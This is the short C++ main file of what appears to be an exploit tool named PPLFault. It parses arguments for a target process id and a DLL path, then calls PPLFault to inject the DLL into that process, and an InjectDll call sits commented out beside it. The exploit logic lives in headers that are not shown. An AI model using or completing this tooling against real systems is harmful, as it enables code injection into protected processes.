#include "exploit.h"
#include "PPLFault.h"

#include <iostream>

BOOL g_bVerbose = FALSE;
BOOL g_bDebug = FALSE;
BOOL g_bForce = FALSE;
DWORD g_dwProcessId = 0;
LPWSTR g_pwszDllPath = NULL;
LPWSTR g_pwszProcessName = NULL;
LPWSTR g_pwszLogPipe = NULL;

int wmain(int argc, wchar_t* argv[])
{
    if (!ParseArguments(argc, argv))
        return 1;

    PrintArguments();

	//InjectDll(g_dwProcessId, g_pwszDllPath);
	PPLFault(g_dwProcessId, g_pwszDllPath);

    return 0;
}
